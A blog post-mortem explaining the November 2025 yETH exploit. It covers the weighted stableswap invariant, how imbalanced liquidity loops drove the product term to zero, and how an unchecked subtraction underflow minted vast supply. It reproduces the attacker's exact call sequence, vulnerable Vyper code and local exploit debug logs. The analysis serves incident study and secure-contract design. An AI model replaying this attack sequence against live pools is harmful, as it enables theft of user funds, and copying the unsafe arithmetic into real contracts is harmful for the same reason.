---
title: "Breaking the yETH Invariant"
published: 2026-01-04
description: How the invariant was broken on Nov 30, 2025, leading to infinite minting.
tags: [DeFi]
category: Post-Mortem
licenseName: "Unlicensed"
author: 0xVrka
sourceLink: "https://github.com/0xvrka/"
draft: false
cover: '../../assets/images/wolf-step-c.png'
---
## Introduction
You might have heard about the yETH exploit. Many people say this attack was sophisticated because you need a deep understanding of the invariant behind weighted stableswap pools to truly understand what happened in the single transaction that caused a multi-million-dollar loss.

In this post, I want to explain step by step how the attacker logically broke the invariant. The goal is to make it understandable without being overwhelming, and to clearly show what the attacker wanted to achieve and how they managed to do it.

**Important References:**
- [Exploit Transaction](https://app.blocksec.com/explorer/tx/eth/0x53fe7ef190c34d810c50fb66f0fc65a1ceedc10309cf4b4013d64042a0331156)
- [yETH Whitepaper](https://github.com/yearn/yETH/blob/main/whitepaper/derivation.pdf)
- [StableSwap Invariant Logic](https://berkeley-defi.github.io/assets/material/StableSwap.pdf)
- [Exploit Summary](https://github.com/0xkorin/yETH-exploit-summary/blob/master/summary.pdf)

## Brief overview of yETH
On Ethereum, users can stake ETH to earn yield. However, the required stake is relatively large, so protocols like Lido emerged to solve this problem by pooling ETH from many users. In return, users receive liquid staking tokens (LSTs) that represent their staked ETH.

Today, there are many LST providers, not just Lido. yETH saw this as an opportunity to create a token that represents a basket of multiple LSTs, allowing users to diversify their staking risk. Users can provide liquidity to the yETH pool and receive yETH in return.

In addition, yETH offers:

- st-yETH, a staking version of yETH
- A stableswap-style AMM for swapping between different LSTs

To calculate how much yETH a user receives when adding liquidity or how much output they receive when swapping, yETH relies on a custom invariant.

## Math behind yETH
### Constant product
If you're familiar with AMMs like Uniswap v2, you probably know the constant-product invariant:

$$
\begin{aligned}
x \cdot y = k
\end{aligned}
$$

This mechanism ensures that a pool containing two tokens never fully empties. When one token becomes scarce, the price to acquire it increases rapidly. Whatever happens, $x \cdot y $  must satisfy $k$, so that's why you need more $y$ if you make $x$ smaller.

However, yETH uses a weighted pool, so this simple formula does not apply directly. Still, it’s useful to understand the intuition behind constant-product AMMs.

### Weighted swap pool
For weighting, yETH adopts a formula similar to Balancer's weighted constant product:

$$
\begin{aligned}
\prod_{i} x_{i}^{w_{i}} = k
\end{aligned}
$$ 
<!-- -->

Each asset has a weight $w_{i}$, allowing the pool to favor certain assets over others.

The problem is that this alone is not sufficient for a stableswap. In a stable environment, assets are expected to trade close to 1:1. With a pure constant-product formula, prices diverge too aggressively as balances change.

### The hybrid method
Michael Egorov proposed a clever solution that combines constant product with constant sum. This hybrid approach preserves tight pricing near equilibrium while retaining safety far from it.

yETH derives its invariant from this idea and adapts it to the weighted setting described in the yETH whitepaper. The resulting equation is:


$$
\begin{aligned}
Af^{n}\sigma + D = ADf^{n} + D\pi
\end{aligned}
$$
<!-- -->

Where:
* **$D$**: The invariant (representing the total supply of LP tokens).
* **$A$**: The amplification coefficient (determines how flat the curve is).
* **$n$**: The number of tokens in the pool.
* **$\sigma$**: A variable representing the sum of balances.

The most important variable here is $\pi$ because this is what the attacker ultimately manipulated.

$$
\begin{aligned}
\pi = D^{n} \prod_{i} \left(\frac{w_{i}}{x_{i}}\right)^{w_{i} n}
\end{aligned}
$$
<!-- -->

There is one more formula involved, but it’s easier to explain once we dive into the protocol logic.

## Core protocol functionality
To understand the exploit, we need to look at the state-changing functions used by the attacker:

### add_liquidity
Adding liquidity updates the virtual balance of the deposited asset along with the constant-sum and constant-product terms. To determine the new LP token supply, the protocol treats the post-deposit supply as an unknown and solves for it using a Newton iteration. The process starts from the previous total supply and iterates until the invariant holds within a fixed precision.

For each guessed supply $D_{m}$ , the value of $\pi$ changes. Computing $\pi$ from scratch is expensive, so the protocol optimizes this by using a ratio-based update:

$$
\begin{aligned}
\pi_{m} = \left(\frac{D_{m}}{D_{m-1}}\right)^{n} \pi_{m-1}
\end{aligned}
$$
<!-- -->

This works because only $D$ changes between iterations, keeping the computation simple and gas-efficient.

### remove_liquidity
Removing liquidity adjusts the virtual balances of all assets as well as the constant-sum and constant-product variables.

### update_rate
Calling update_rate refreshes asset rates using oracle data. If a mismatch appears between the calculated supply and the actual staking supply, the protocol resolves it by burning a portion of liquidity.

## The general idea of the attack
Before we deep dive regarding the intention behind the particular function calls by the attacker, we must know the general idea first:

<svg viewBox="0 0 520 420" xmlns="http://www.w3.org/2000/svg" style="background: #f9f9f9; border: 1px solid #e0e0e0; border-radius: 8px; margin: 20px auto; max-width: 520px; display: block;">
  <style>
    .box { fill: #ffffff; stroke: #333; stroke-width: 1.5px; rx: 4; }
    .decision { fill: #fff0f0; stroke: #d32f2f; stroke-width: 1.5px; }
    .text { font-family: sans-serif; font-size: 13px; fill: #333; text-anchor: middle; dominant-baseline: middle; }
    .arrow { stroke: #333; stroke-width: 1.5px; fill: none; marker-end: url(#arrowhead); }
  </style>
  <defs>
    <marker id="arrowhead" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0 0, 8 3, 0 6" fill="#333" />
    </marker>
  </defs>

  <rect x="50" y="20" width="160" height="35" class="box" />
  <text x="130" y="38" class="text">Start Attack</text>

  <rect x="50" y="80" width="160" height="35" class="box" />
  <text x="130" y="98" class="text">Loop: Add/Remove Liq</text>

  <rect x="50" y="140" width="160" height="40" class="decision" />
  <text x="130" y="160" class="text">Is Pi close to 0?</text>

  <rect x="280" y="80" width="180" height="35" class="box" />
  <text x="370" y="98" class="text">Add Liquidity (Pi=0)</text>

  <rect x="280" y="140" width="180" height="35" class="box" />
  <text x="370" y="158" class="text">Remove Liq (Amount 0)</text>
  
  <rect x="280" y="200" width="180" height="35" class="box" />
  <text x="370" y="218" class="text">Update Rate (Burn)</text>

  <rect x="280" y="260" width="180" height="35" class="box" />
  <text x="370" y="278" class="text">Remove Liq (Real Amt)</text>

  <rect x="280" y="320" width="180" height="40" class="decision" />
  <text x="370" y="340" class="text">Is Pool Empty?</text>

  <rect x="150" y="380" width="200" height="35" class="box" style="stroke: #d32f2f; fill: #ffebee;" />
  <text x="250" y="398" class="text" style="font-weight:bold; fill: #c62828;">Trigger Underflow Mint</text>

  <path d="M130 55 L130 80" class="arrow" />
  
  <path d="M130 115 L130 140" class="arrow" />

  <path d="M50 160 L20 160 L20 98 L50 98" class="arrow" />
  <text x="30" y="130" class="text" style="font-size: 11px;">No</text>

  <path d="M210 160 L245 160 L245 98 L280 98" class="arrow" />
  <text x="230" y="130" class="text" style="font-size: 11px;">Yes</text>

  <path d="M370 115 L370 140" class="arrow" />
  <path d="M370 175 L370 200" class="arrow" />
  <path d="M370 235 L370 260" class="arrow" />
  <path d="M370 295 L370 320" class="arrow" />

  <path d="M460 340 L500 340 L500 65 L130 65 L130 80" class="arrow" />
  <text x="480" y="330" class="text" style="font-size: 11px;">No</text>

  <path d="M370 360 L370 380 L350 380" class="arrow" />
  <text x="385" y="370" class="text" style="font-size: 11px;">Yes</text>
</svg>

1. The attacker calls a sequence of add liquidity and remove liquidity before making the $\pi$ become 0.
2. Because $\pi$ becomes 0, the attacker gets more yETH than they should when adding liquidity (remember that in the math section, if $\pi$ or the constant product becomes 0, the numerator calculation is just the constant sum only).
3. After that, the attacker calls remove liquidity using 0 amount to make the pool recalculate the correct $\pi$.
4. To drain the amount of total supply, the attacker calls the update_rate function to burn the supply in the staking contract.
5. Now the attacker calls remove liquidity for the correct amount to drain the LST assets in the pool.
6. The attacker repeats this sequence of calls until it fully drains the pool.
7. When the pool is empty, the attacker calls add liquidity and triggers an integer underflow to mint $2.6 \cdot 10^{56}$.

## Deep dive to the exploit
### How does `$\ \pi \ $` become zero?

The update rules are:

$$
\begin{aligned}
D_{m+1} &= \frac{Af^{n}\sigma - D_{m}\pi_{m}}{Af^{n} - 1} \\
\\
\pi_{m+1} &= \left(\frac{D_{m+1}}{D_{m}}\right)^{n} \pi_{m}
\end{aligned}
$$
<!-- -->

If $D_{m+1} < D_{m}$ then $\pi$ is multiplied by a value smaller than 1. Repeating this process causes $\pi$ to monotonically decrease and eventually truncate to zero due to integer arithmetic.

### Why can `$\ D_{m+1} < D_{m} \ $`?

The key idea is that the attacker needs to create a situation where the ratio between $D_{m+1}$ and $D_{m}$ behaves badly. More specifically, they want the value of $\pi$ computed at step $D_{m+2}$ to become large enough that the next Newton step produces $D_{m+2} < D_{m+1}$. To make that happen, both $D_{m}$ and $\pi$ need to be pushed low enough so that the ratio term amplifies the effect in the following iteration.

At first glance, it seems like reducing $\pi$ while keeping the invariant valid would require shrinking the constant-sum term. But that isn’t what the attacker targets directly. Instead, they exploit imbalance. By flooding the pool with high-weight assets and draining low-weight ones, the product term $\pi$ collapses even though the invariant still appears to hold.

This works because balances are raised to the power of their weights. Overfilling high-weight assets suppresses $\pi$ much faster than draining low-weight assets can restore it, allowing the solver to converge to a smaller supply without violating the invariant.

In yETH, each asset has an associated weight:

<div style="font-family: monospace; font-size: 14px; margin-bottom: 20px;">
  <div style="margin-bottom: 8px;">
    <span>Assets 0-5 (High Weight)</span>
    <div style="width: 100%; background: #eee; height: 18px; border-radius: 4px; margin-top: 2px;">
      <div style="width: 85%; background: #3b82f6; height: 100%; border-radius: 4px;"></div>
    </div>
    <span style="font-size: 12px; color: #666;">Weight: ~5.7e22</span>
  </div>
  <div>
    <span>Assets 6-7 (Low Weight)</span>
    <div style="width: 100%; background: #eee; height: 18px; border-radius: 4px; margin-top: 2px;">
      <div style="width: 20%; background: #ef4444; height: 100%; border-radius: 4px;"></div>
    </div>
    <span style="font-size: 12px; color: #666;">Weight: ~1.1e22</span>
  </div>
</div>

Assets 6 and 7 have significantly lower weights compared to the others. This difference drives the attacker’s liquidity strategy. Over multiple rounds, liquidity is repeatedly added to assets 0, 1, 2, 4, and 5, while deposits into assets 3, 6, and 7 are intentionally avoided:

```solidity
POOL.add_liquidity([610669608721347951666, 777507145787198969404, 563973440562370010057, 0, 476460390272167461711, 0, 0, 0], 0, attacker);
POOL.remove_liquidity(2789348310901989968648, new uint256, attacker);

POOL.add_liquidity([1636245238220874001286, 1531136279659070868194, 1041815511903532551187, 0, 991050908418104947336, 1346008005663580090716, 0, 0], 0, attacker);
POOL.remove_liquidity(7379203011929903830039, new uint256, attacker);

POOL.add_liquidity([1630811661792970363090, 1526051744772289698092, 1038108768586660585581, 0, 969651157511131341121, 1363135138655820584263, 0, 0], 0, attacker);
POOL.remove_liquidity(7066638371690257003757, new uint256, attacker);

POOL.add_liquidity([859805263416698094503, 804573178584505833740, 546933182262586953508, 0, 510865922059584325991, 723182384178548055243, 0, 0], 0, attacker);
POOL.remove_liquidity(3496158478994807127953, new uint256, attacker);

POOL.add_liquidity([1784169320136805803209, 1669558029141448703194, 1135991585797559066395, 0, 1061079136814511050837, 1488254960317842892500, 0, 0], 0, attacker);
```

The attacker repeatedly adds liquidity to assets 0, 1, 2, 4, and 5, inflating the balances of the higher-weight assets and shrinking their contribution to the product term $\pi$. At the same time, assets 3, 6, and 7 are left unreplenished, allowing them to be gradually drained from the pool and pushing $\pi$ closer to zero.

After $\pi$ reaches zero, the attacker starts adding liquidity back to asset 3. This is necessary because asset 3 has a weight similar to assets 2 and 4, and keeping it drained would otherwise cause $\pi$ to move upward when the solver recalculates. Assets 6 and 7 remain ignored, since their much lower weights mean their balances have little influence on $\pi$.

### Driving total supply toward zero
Calling remove_liquidity(0) forces the pool to recompute and store the correct $\pi$.
```python
# Pool.vy: remove_liquidity
    # ...
    # Recompute pi (vb_prod) based on current balances
    vb_prod = unsafe_div(unsafe_mul(vb_prod, self._pow_down(unsafe_div(unsafe_mul(supply, weight), vb), unsafe_mul(weight, num_assets))), PRECISION)
    # ...
    # Store the corrected pi (vb_prod) and sum (vb_sum)
    self.packed_pool_vb = self._pack_pool_vb(vb_prod, vb_sum)
```
Immediately after, update_rate is called, which subtracts the inflated supply from the staking contract and burns it.

```python
# Pool.vy: _update_supply (called via update_rates)
    # Calculate what the supply SHOULD be (supply) vs what is stored (_supply)
    supply, vb_prod = self._calc_supply(self.num_assets, _supply, self.amplification, _vb_prod, _vb_sum, True)
    
    if supply > _supply:
        PoolToken(token).mint(self.staking, supply - _supply)
    elif supply < _supply:
        # The stored supply is inflated, so we burn the difference from Staking
        PoolToken(token).burn(self.staking, _supply - supply)
    self.supply = supply
```

By repeating this process, the attacker drains the effective yETH supply to zero.

### Underflow yETH mint
After repeating this sequence, the attacker fully drains the pool and sets up the final step of the exploit. At this point, both the total supply and the constant-sum term inside the pool have effectively reached zero.

The attacker then makes a final add_liquidity call, adding minimal amounts across the pool but intentionally adding 9 units to asset index 7. This is done to push the invariant into a state where $D_{m} \cdot \pi > \sigma \cdot A$, which triggers an integer underflow in the solver.

```python
# Pool.vy: _calc_supply

    # l represents (A * sigma)
    l: uint256 = _amplification 
    d: uint256 = l - PRECISION 
    l = l * _vb_sum
    
    # s represents Supply (D), r represents Product (pi)
    s: uint256 = _supply 
    r: uint256 = _vb_prod 

    for _ in range(255):
        assert s > 0
        # --------
        # unsafe_sub allows underflow if (s * r) > l
        # This occurs when D * pi > A * sigma
        sp: uint256 = unsafe_div(unsafe_sub(l, unsafe_mul(s, r)), d) 
        # --------
```

Asset 7 is chosen because it has the lowest weight, allowing the attacker to adjust the value of $\pi$ with finer precision while barely affecting it overall. 

## Under the Hood
It is one thing to understand the math, but seeing the internal state collapse in real-time tells the full story. I instrumented the contract with debug logs and ran the exploit locally to capture exactly what happens inside the solver. The output below confirms the moments where the convergence fails and the invariant breaks.

### 1. Convergence Instability (`$D_{m+1} < D_m$`) & Product Term Collapse (`$\pi \rightarrow 0$`)
Here, we can see the Newton-Raphson solver struggling as the product term $\pi$ is manipulated down to zero.

```text
    │   ├─ emit DebugVal(tag: "remove liquidity :", val: 5)
    │   ├─ emit DebugVal(tag: "add liquidity :", val: 5)
    │   ├─ emit DebugVal(tag: "Asset Index", val: 0)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 684908434204245837382 [6.849e20])
    │   ├─ emit DebugVal(tag: "asset weight", val: 57646130206133453000000 [5.764e22])
    │   ├─ emit DebugVal(tag: "Virtual Balance After", val: 2722795789717095953933 [2.722e21])
    │   ├─ emit DebugVal(tag: "Asset Index", val: 1)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 684906035678011109882 [6.849e20])
    │   ├─ emit DebugVal(tag: "asset weight", val: 57646130206133453000000 [5.764e22])
    │   ├─ emit DebugVal(tag: "Virtual Balance After", val: 2722786259230849981416 [2.722e21])
    │   ├─ emit DebugVal(tag: "Asset Index", val: 2)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 410441629717699458558 [4.104e20])
    │   ├─ emit DebugVal(tag: "asset weight", val: 57646130206028595300000 [5.764e22])
    │   ├─ emit DebugVal(tag: "Virtual Balance After", val: 1632471746540461454317 [1.632e21])
    │   ├─ emit DebugVal(tag: "Asset Index", val: 3)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 3532430177171936798 [3.532e18])
    │   ├─ emit DebugVal(tag: "asset weight", val: 57646130206028595300000 [5.764e22])
    │   ├─ emit DebugVal(tag: "Asset Index", val: 4)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 410441628495198523353 [4.104e20])
    │   ├─ emit DebugVal(tag: "asset weight", val: 57646130206028595300000 [5.764e22])
    │   ├─ emit DebugVal(tag: "Virtual Balance After", val: 1632471745317960519112 [1.632e21])
    │   ├─ emit DebugVal(tag: "Asset Index", val: 5)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 549134391241242137316 [5.491e20])
    │   ├─ emit DebugVal(tag: "asset weight", val: 57646130206185881850000 [5.764e22])
    │   ├─ emit DebugVal(tag: "Virtual Balance After", val: 2187825559835234235400 [2.187e21])
    │   ├─ emit DebugVal(tag: "Asset Index", val: 6)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 655788662506859028 [6.557e17])
    │   ├─ emit DebugVal(tag: "asset weight", val: 11529226041210961945000 [1.152e22])
    │   ├─ emit DebugVal(tag: "Asset Index", val: 7)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 629735375533480721 [6.297e17])
    │   ├─ emit DebugVal(tag: "asset weight", val: 11529226041210961945000 [1.152e22])
    │   ├─ emit DebugVal(tag: "l-s*r", val: 4905866498423088505346910921942316732319016 [4.905e42])
    │   ├─ emit DebugVal(tag: "s value:", val: 2514337702656951993513 [2.514e21])
    │   ├─ emit DebugVal(tag: "r value:", val: 3530246247551768 [3.53e15])
    │   ├─ emit DebugVal(tag: "l value:", val: 4905875374654328387984700000000000000000000 [4.905e42])
    │   ├─ emit DebugVal(tag: "d value:", val: 449000000000000000000 [4.49e20])
    │   ├─ emit DebugVal(tag: "A value:", val: 450000000000000000000 [4.5e20])
    │   ├─ emit DebugVal(tag: "Result of numerator:", val: 4905866498423088505346910921942316732319016 [4.905e42])
    │   ├─ emit DebugVal(tag: "Guess total supply", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "prev total supply (s)", val: 2514337702656951993513 [2.514e21])
    │   ├─ emit DebugVal(tag: "Numerator", val: 38572197766253986103007535765238691176 [3.857e37])
    │   ├─ emit DebugVal(tag: "phi previous", val: 3530246247551768 [3.53e15])
    │   ├─ emit DebugVal(tag: "phi after", val: 15340897813962681 [1.534e16])
    │   ├─ emit DebugVal(tag: "Guess total supply", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "prev total supply (s)", val: 2514337702656951993513 [2.514e21])
    │   ├─ emit DebugVal(tag: "Numerator", val: 167617809891428754714798791940369653367 [1.676e38])
    │   ├─ emit DebugVal(tag: "phi previous", val: 15340897813962681 [1.534e16])
    │   ├─ emit DebugVal(tag: "phi after", val: 66664795947777258 [6.666e16])
    │   ├─ emit DebugVal(tag: "Guess total supply", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "prev total supply (s)", val: 2514337702656951993513 [2.514e21])
    │   ├─ emit DebugVal(tag: "Numerator", val: 728393294130092909722226816352672303606 [7.283e38])
    │   ├─ emit DebugVal(tag: "phi previous", val: 66664795947777258 [6.666e16])
    │   ├─ emit DebugVal(tag: "phi after", val: 289695888249372724 [2.896e17])
    │   ├─ emit DebugVal(tag: "Guess total supply", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "prev total supply (s)", val: 2514337702656951993513 [2.514e21])
    │   ├─ emit DebugVal(tag: "Numerator", val: 3165276955219413177173868167453318467468 [3.165e39])
    │   ├─ emit DebugVal(tag: "phi previous", val: 289695888249372724 [2.896e17])
    │   ├─ emit DebugVal(tag: "phi after", val: 1258890940494827080 [1.258e18])
    │   ├─ emit DebugVal(tag: "Guess total supply", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "prev total supply (s)", val: 2514337702656951993513 [2.514e21])
    │   ├─ emit DebugVal(tag: "Numerator", val: 13754901759781527840720325239872192117560 [1.375e40])
    │   ├─ emit DebugVal(tag: "phi previous", val: 1258890940494827080 [1.258e18])
    │   ├─ emit DebugVal(tag: "phi after", val: 5470586447177100464 [5.47e18])
    │   ├─ emit DebugVal(tag: "Guess total supply", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "prev total supply (s)", val: 2514337702656951993513 [2.514e21])
    │   ├─ emit DebugVal(tag: "Numerator", val: 59772754516555737377334230326754254445648 [5.977e40])
    │   ├─ emit DebugVal(tag: "phi previous", val: 5470586447177100464 [5.47e18])
    │   ├─ emit DebugVal(tag: "phi after", val: 23772763083253553057 [2.377e19])
    │   ├─ emit DebugVal(tag: "Guess total supply", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "prev total supply (s)", val: 2514337702656951993513 [2.514e21])
    │   ├─ emit DebugVal(tag: "Numerator", val: 259746106871008404415708252387492752387599 [2.597e41])
    │   ├─ emit DebugVal(tag: "phi previous", val: 23772763083253553057 [2.377e19])
    │   ├─ emit DebugVal(tag: "phi after", val: 103305974609746888508 [1.033e20])
    │   ├─ emit DebugVal(tag: "Guess total supply", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "prev total supply (s)", val: 2514337702656951993513 [2.514e21])
    │   ├─ emit DebugVal(tag: "Numerator", val: 1128742360634528852966913445056652375332356 [1.128e42])
    │   ├─ emit DebugVal(tag: "phi previous", val: 103305974609746888508 [1.033e20])
    │   ├─ emit DebugVal(tag: "phi after", val: 448922338253037271569 [4.489e20])
    │   ├─ emit DebugVal(tag: "l-s*r", val: 857424477639571851431090947373029963617 [8.574e38])
    │   ├─ emit DebugVal(tag: "s value:", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "r value:", val: 448922338253037271569 [4.489e20])
    │   ├─ emit DebugVal(tag: "l value:", val: 4905875374654328387984700000000000000000000 [4.905e42])
    │   ├─ emit DebugVal(tag: "d value:", val: 449000000000000000000 [4.49e20])
    │   ├─ emit DebugVal(tag: "A value:", val: 450000000000000000000 [4.5e20])
    │   ├─ emit DebugVal(tag: "Result of numerator:", val: 857424477639571851431090947373029963617 [8.574e38])
    │   ├─ emit DebugVal(tag: "Guess total supply", val: 1909631353317531963 [1.909e18])
    │   ├─ emit DebugVal(tag: "prev total supply (s)", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "Numerator", val: 857276172332618412565774818410468659947 [8.572e38])
    │   ├─ emit DebugVal(tag: "phi previous", val: 448922338253037271569 [4.489e20])
    │   ├─ emit DebugVal(tag: "phi after", val: 78460553604765033 [7.846e16])
    │   ├─ emit DebugVal(tag: "Guess total supply", val: 1909631353317531963 [1.909e18])
    │   ├─ emit DebugVal(tag: "prev total supply (s)", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "Numerator", val: 149830733162310210819067416082249779 [1.498e35])
    │   ├─ emit DebugVal(tag: "phi previous", val: 78460553604765033 [7.846e16])
    │   ├─ emit DebugVal(tag: "phi after", val: 13712969811041 [1.371e13])
    │   ├─ emit DebugVal(tag: "Guess total supply", val: 1909631353317531963 [1.909e18])
    │   ├─ emit DebugVal(tag: "prev total supply (s)", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "Numerator", val: 26186717098260685391132587803483 [2.618e31])
    │   ├─ emit DebugVal(tag: "phi previous", val: 13712969811041 [1.371e13])
    │   ├─ emit DebugVal(tag: "phi after", val: 2396688939 [2.396e9])
    │   ├─ emit DebugVal(tag: "Guess total supply", val: 1909631353317531963 [1.909e18])
    │   ├─ emit DebugVal(tag: "prev total supply (s)", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "Numerator", val: 4576792342063729810501057257 [4.576e27])
    │   ├─ emit DebugVal(tag: "phi previous", val: 2396688939 [2.396e9])
    │   ├─ emit DebugVal(tag: "phi after", val: 418882 [4.188e5])
    │   ├─ emit DebugVal(tag: "Guess total supply", val: 1909631353317531963 [1.909e18])
    │   ├─ emit DebugVal(tag: "prev total supply (s)", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "Numerator", val: 799910200540354423725366 [7.999e23])
    │   ├─ emit DebugVal(tag: "phi previous", val: 418882 [4.188e5])
    │   ├─ emit DebugVal(tag: "phi after", val: 73)
    │   ├─ emit DebugVal(tag: "guess < previous!", val: 1909631353317531963 [1.909e18])
    │   ├─ emit DebugVal(tag: "BUG CAUGHT: Guess total supply", val: 1909631353317531963 [1.909e18])
    │   ├─ emit DebugVal(tag: "BUG CAUGHT: prev total supply (s)", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "BUG CAUGHT: Numerator", val: 139403088792179833299 [1.394e20])
    │   ├─ emit DebugVal(tag: "BUG CAUGHT: phi previous", val: 73)
    │   ├─ emit DebugVal(tag: "phi after", val: 0)
    │   ├─ emit DebugVal(tag: "guess < previous!", val: 1909631353317531963 [1.909e18])
    │   ├─ emit DebugVal(tag: "BUG CAUGHT: Guess total supply", val: 1909631353317531963 [1.909e18])
    │   ├─ emit DebugVal(tag: "BUG CAUGHT: prev total supply (s)", val: 10926206009850976626607 [1.092e22])
    │   ├─ emit DebugVal(tag: "BUG CAUGHT: Numerator", val: 0)
    │   ├─ emit DebugVal(tag: "BUG CAUGHT: phi previous", val: 0)
    │   ├─ emit DebugVal(tag: "phi after", val: 0)
```

### 2. The Underflow Condition (`$s \cdot r > l$`)
In the final step, the tiny addition to Asset 7 pushes the state such that $s \cdot r$ exceeds $l$, triggering the massive underflow.

```text
    │   ├─ emit DebugVal(tag: "add liquidity :", val: 13)
    │   ├─ emit DebugVal(tag: "Asset Index", val: 0)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 0)
    │   ├─ emit DebugVal(tag: "asset weight", val: 57646130206133453000000 [5.764e22])
    │   ├─ emit DebugVal(tag: "Virtual Balance After", val: 1)
    │   ├─ emit DebugVal(tag: "Asset Index", val: 1)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 0)
    │   ├─ emit DebugVal(tag: "asset weight", val: 57646130206133453000000 [5.764e22])
    │   ├─ emit DebugVal(tag: "Virtual Balance After", val: 1)
    │   ├─ emit DebugVal(tag: "Asset Index", val: 2)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 0)
    │   ├─ emit DebugVal(tag: "asset weight", val: 57646130206028595300000 [5.764e22])
    │   ├─ emit DebugVal(tag: "Virtual Balance After", val: 1)
    │   ├─ emit DebugVal(tag: "Asset Index", val: 3)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 0)
    │   ├─ emit DebugVal(tag: "asset weight", val: 57646130206028595300000 [5.764e22])
    │   ├─ emit DebugVal(tag: "Virtual Balance After", val: 1)
    │   ├─ emit DebugVal(tag: "Asset Index", val: 4)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 0)
    │   ├─ emit DebugVal(tag: "asset weight", val: 57646130206028595300000 [5.764e22])
    │   ├─ emit DebugVal(tag: "Virtual Balance After", val: 1)
    │   ├─ emit DebugVal(tag: "Asset Index", val: 5)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 0)
    │   ├─ emit DebugVal(tag: "asset weight", val: 57646130206185881850000 [5.764e22])
    │   ├─ emit DebugVal(tag: "Virtual Balance After", val: 1)
    │   ├─ emit DebugVal(tag: "Asset Index", val: 6)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 0)
    │   ├─ emit DebugVal(tag: "asset weight", val: 11529226041210961945000 [1.152e22])
    │   ├─ emit DebugVal(tag: "Virtual Balance After", val: 1)
    │   ├─ emit DebugVal(tag: "Asset Index", val: 7)
    │   ├─ emit DebugVal(tag: "Virtual Balance previous", val: 0)
    │   ├─ emit DebugVal(tag: "asset weight", val: 11529226041210961945000 [1.152e22])
    │   ├─ emit DebugVal(tag: "Virtual Balance After", val: 9)
    │   ├─ emit DebugVal(tag: "constant sum or s value:", val: 16)
    │   ├─ emit DebugVal(tag: "constant product or p value:", val: 912984419784149786092 [9.129e20])
    │   ├─ emit DebugVal(tag: "l-s*r", val: 115792089237316195423570985008687907853269984665640564032049833291366733062464 [1.157e77])
    │   ├─ emit DebugVal(tag: "BUG CAUGHT: s value:", val: 16)
    │   ├─ emit DebugVal(tag: "BUG CAUGHT: r value:", val: 912984419784149786092 [9.129e20])
    │   ├─ emit DebugVal(tag: "BUG CAUGHT: l value:", val: 7200000000000000000000 [7.2e21])
    │   ├─ emit DebugVal(tag: "BUG CAUGHT: d value:", val: 449000000000000000000 [4.49e20])
    │   ├─ emit DebugVal(tag: "BUG CAUGHT: A value:", val: 450000000000000000000 [4.5e20])
    │   ├─ emit DebugVal(tag: "BUG CAUGHT: Result of underflow:", val: 115792089237316195423570985008687907853269984665640564032049833291366733062464 [1.157e77])
```

## Conclusion
This exploit demonstrates how unsafe gas optimizations, especially those involving arithmetic assumptions, can have catastrophic consequences. Even when the math is theoretically sound, implementation shortcuts can invalidate critical guarantees.

If there is one takeaway from this incident, it is that invariants are only as strong as their weakest optimization.

Thanks for reading, and I hope you learned something new.
    